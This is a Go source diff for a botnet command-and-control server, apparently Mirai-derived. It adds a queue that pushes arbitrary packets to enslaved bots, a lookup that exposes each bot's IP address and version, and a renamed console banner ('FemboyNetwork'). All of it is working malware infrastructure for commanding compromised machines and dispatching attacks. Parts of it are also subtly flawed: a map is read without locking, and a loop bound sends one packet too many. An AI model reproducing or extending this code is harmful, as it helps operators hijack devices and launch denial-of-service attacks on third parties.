@@ -13,6 +13,13 @@ type AttackSend struct {
 	botCata string
 }
 
+type PktSend struct {
+	pktType uint8
+	payload []byte
+	count   int
+	botCata string
+}
+
 type ClientList struct {
 	uid         int
 	count       int
@@ -20,6 +27,7 @@ type ClientList struct {
 	addQueue    chan *Bot
 	delQueue    chan *Bot
 	atkQueue    chan *AttackSend
+	pktQueue    chan *PktSend
 	totalCount  chan int
 	cntView     chan int
 	distViewReq chan int
@@ -28,7 +36,9 @@ type ClientList struct {
 }
 
 func NewClientList() *ClientList {
-	c := &ClientList{0, 0, make(map[int]*Bot), make(chan *Bot, 128), make(chan *Bot, 128), make(chan *AttackSend), make(chan int, 64), make(chan int), make(chan int), make(chan map[string]int), &sync.Mutex{}}
+	c := &ClientList{0, 0, make(map[int]*Bot), make(chan *Bot, 128), make(chan *Bot, 128),
+		make(chan *AttackSend), make(chan *PktSend, 128),
+		make(chan int, 64), make(chan int), make(chan int), make(chan map[string]int), &sync.Mutex{}}
 	go c.worker()
 	go c.fastCountWorker()
 	return c
@@ -49,9 +59,24 @@ func (this *ClientList) Distribution() map[string]int {
 	return <-this.distViewRes
 }
 
+func (this *ClientList) GetBotInfo(index int) (string, string, string) {
+	// returns (ip, source, version) for bot at position index, or empty if not found
+	for _, v := range this.clients {
+		if v.uid == index {
+			return v.conn.RemoteAddr().String(), v.source, fmt.Sprintf("%d", v.version)
+		}
+	}
+	return "", "", ""
+}
+
+func (this *ClientList) BotCount() int {
+	// requires cntMutex + totalCount to be accurate, or use Count()
+	return this.count
+}
+
 func (this *ClientList) AddClient(c *Bot) {
 	this.addQueue <- c
-	fmt.Printf("\033[1;91m[\033[0;91mNullPointer\033[1;91m]\033[0;97m Bot \033[1;91m[\033[0;97m%s\033[1;91m]\033[0;97m %s\033[1;91m]\n", c.conn.RemoteAddr(), c.source)
+	fmt.Printf("\033[1;91m[\033[0;91mFemboyNetwork\033[1;91m]\033[0;97m Bot \033[1;91m[\033[0;97m%s\033[1;91m]\033[0;97m %s\033[1;91m]\n", c.conn.RemoteAddr(), c.source)
 }
 
 func (this *ClientList) DelClient(c *Bot) {
@@ -61,6 +86,10 @@ func (this *ClientList) DelClient(c *Bot) {
 func (this *ClientList) QueueBuf(buf []byte, maxbots int, botCata string) {
 	attack := &AttackSend{buf, maxbots, botCata}
 	this.atkQueue <- attack
+}
+
+func (this *ClientList) QueuePkt(pktType uint8, payload []byte, maxbots int, botCata string) {
+	this.pktQueue <- &PktSend{pktType, payload, maxbots, botCata}
 }
 
 func (this *ClientList) fastCountWorker() {
@@ -115,6 +144,32 @@ func (this *ClientList) worker() {
 			}
 			if debugMode {
 				fmt.Printf("[cnc] attack queued: sent=%d maxbots=%d filter=%q total=%d\n", sent, atk.count, atk.botCata, this.count)
+			}
+			break
+		case pkt := <-this.pktQueue:
+			sent := 0
+			if pkt.count == -1 {
+				for _, v := range this.clients {
+					if pkt.botCata == "" || pkt.botCata == v.source {
+						v.SendPkt(pkt.pktType, pkt.payload)
+						sent++
+					}
+				}
+			} else {
+				var count int
+				for _, v := range this.clients {
+					if count > pkt.count {
+						break
+					}
+					if pkt.botCata == "" || pkt.botCata == v.source {
+						v.SendPkt(pkt.pktType, pkt.payload)
+						count++
+						sent++
+					}
+				}
+			}
+			if debugMode {
+				fmt.Printf("[cnc] pkt queued: type=%d sent=%d total=%d\n", pkt.pktType, sent, this.count)
 			}
 			break
 		case <-this.cntView:
